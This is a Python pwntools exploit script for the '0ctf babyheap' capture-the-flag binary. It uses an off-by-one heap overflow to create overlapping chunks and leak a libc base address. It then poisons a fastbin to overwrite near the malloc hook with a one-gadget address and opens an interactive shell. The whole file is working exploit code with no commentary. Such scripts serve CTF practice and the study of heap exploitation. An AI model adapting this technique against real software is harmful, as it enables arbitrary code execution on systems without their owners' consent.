from pwn import *

# [*] '/media/psf/Home/CTF_BIN/0ctf/babyheap/babyheap'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

r = process("./babyheap")

def sa(a,b):
    return r.sendlineafter(a,b)

def add(size):
    sa("Command: ","1")
    sa("Size: ",str(size))

def edit(size,content,index):
    sa("Command: ","2")
    sa("Index: ",str(index))
    sa("Size: ",str(size))
    sa("Content: ",content)

def free(index):
    sa("Command: ","3")
    sa("Index: ",str(index))

def show(index):
    sa("Command: ","4")
    sa("Index: ",str(index))

def exp():
    add(0x18)#0
    add(0x100)#1
    edit(0x100,p64(0x100)*2*0x10,1)
    add(0x100)#2
    add(0x100)#3

    free(0)
    free(1)
    add(0x18)#0
    edit(0x19,"a"*0x18 + '\x00',0)
    add(0x80)#1
    add(0x60)#4
    free(1)
    free(2)
    add(0x80)
    show(4)
    r.recvuntil("Content: \n")
    base = u64(r.recv(6) + '\x00\x00') - 0x3C4B78 
    print "%x "%(base + 0x3C4B78)

    free(1)
    add(0x100)
    payload = p64(0)*2*8
    payload += p64(0) + p64(0x70)
    payload += p64(0)*2*6
    payload += p64(0x70) + p64(0x101)
    edit(len(payload),payload,1)
    free(4)
    payload = p64(0)*2*8
    payload += p64(0) + p64(0x71)
    payload += p64(base + 3951376 - 0x23) + p64(0)
    payload += p64(0)*2*5
    payload += p64(0x70) + p64(0x101)
    edit(len(payload),payload,1)

    add(0x60)
    add(0x60)
    payload = "aaa" +p64(base+0xf1147)*2 +p64(base + 0x846D0)
    raw_input()
    edit(len(payload),payload,4)
    r.interactive()


if __name__ == "__main__":
    exp()
